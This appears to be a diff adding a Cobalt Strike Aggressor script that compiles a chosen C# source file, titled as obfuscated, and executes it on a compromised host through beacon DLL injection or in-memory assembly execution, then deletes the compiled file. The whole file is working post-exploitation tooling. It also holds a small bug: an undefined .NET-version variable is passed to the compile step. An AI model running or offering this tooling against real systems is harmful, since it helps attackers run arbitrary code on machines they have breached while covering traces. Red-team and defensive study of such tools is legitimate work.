@@ -1,0 +1,119 @@
+#https://www.cobaltstrike.com/aggressor-script/functions.html
+#https://github.com/harleyQu1nn/AggressorScripts/blob/master/CertUtilWebDelivery.cna
+
+sub execute_binary
+{
+	$bid = $1;
+	$outfile = $2;
+	$arguments = $3;
+
+	# Execute binary
+	if($outputformat eq "dll") 
+	{
+		bdllinject($bid, beacon_info($bid, "pid"), $outfile);
+	}
+	else
+	{
+		bexecute_assembly($bid, $outfile, $arguments);
+	}
+
+	while (-exists $outfile)
+	{
+		sleep(100);
+		deleteFile($outfile);
+	}
+}
+
+sub compile {
+	# Set variables
+	$file = $1;
+	$outputformat = $2;
+	$version = iff($3 eq "true", "net35", "net40");
+	$outfile = "/tmp/" . int(rand() * 100000) . "." . $outputformat;
+
+	# Compile
+	@command = @("bash", script_resource("compilerscript.sh"), script_resource("Compiler/bin/Release/netcoreapp2.1/Compiler.dll"), $file, $outfile, $version, $outputformat);
+	exec(@command);
+	
+	# https://github.com/SpiderLabs/SharpCompile/blob/master/SharpCompile.cna
+	# Workaround to make sure full binary has been received
+	# Increase sleep if your binary fails to compile from CS
+	sleep(2000);
+	$size = -1;
+	# 15Sec waiting time
+	$timeout = 15;
+	while ((!-exists $outfile || $size < 0 || $size < $newsize) && $timeout > 0) {
+		$size = $newsize;
+		$newsize = lof($outfile);
+		sleep(1000);
+		$timeout -= 1;
+	}
+	# If compiling failed, return ""
+	if($timeout <= 0)
+	{
+		return "";
+	}
+
+	return $outfile;
+}
+
+sub main 
+{
+	$bid = $1;
+	$file = $2;
+	$outputformat = $3;
+	$dotnet35 = $4;
+	$args = $5;
+
+	# Compile the .cs file
+	blog2($bid, "Compiling..");
+	$outfile = compile($file, $outputformat, $dotnet);
+
+	# Check if we returned path to .exe
+	if($outfile eq "")
+	{
+		berror($bid, "Timeout while attempting to compile");
+		return;
+	}
+	blog($bid, "Compilation successful, now executing binary");
+	# Execute binary and cleanup
+	execute_binary($bid, $outfile, $args, $outputformat);
+}
+
+
+# Create a popup menu
+popup beacon {
+	menu "&Execute .cs file" {
+		item "Execute .cs file as exe/dll" {
+			local('$dialog %defaults');
+			foreach $bid ($1){
+				# Create our dialog
+				$dialog = dialog("Compile, Obfuscate and execute .cs source file as exe/dll", %defaults, lambda({
+					main($bid, $3["file"], $3["output"], $3["dotnet35"], "");
+				}));
+				drow_file($dialog, "file", "Choose a .CS file:");
+				drow_combobox($dialog, "output", "Output: ", @("exe","dll"));
+				drow_checkbox($dialog, "dotnet35", "dotnet35: ", "Compile for dotnet35 instead of dotnet40");
+				dbutton_action($dialog, "Execute");
+				# Show our dialog
+				dialog_show($dialog);
+			}
+		}
+		item "Execute .cs file w/ arguments as .exe" {
+			local('$dialog %defaults');
+				foreach $bid ($1){
+                    # Create our dialog
+                    $dialog = dialog("Compile, Obfuscate and execute .cs source file as exe", %defaults, lambda({
+                        main($bid, $3["file"], $3["output"], $3["dotnet35"], $3["args"]);
+                    }));
+                    drow_file($dialog, "file", "Choose a .CS file:");
+                    drow_text($dialog, "args",  "Assembly Arguments:");
+                    drow_combobox($dialog, "output", "Output: ", @("exe"));
+                    drow_checkbox($dialog, "dotnet35", "dotnet35: ", "Compile for dotnet35 instead of dotnet40");
+                    dbutton_action($dialog, "Execute");
+				# Show our dialog
+				dialog_show($dialog);
+           }
+        }
+	}
+}
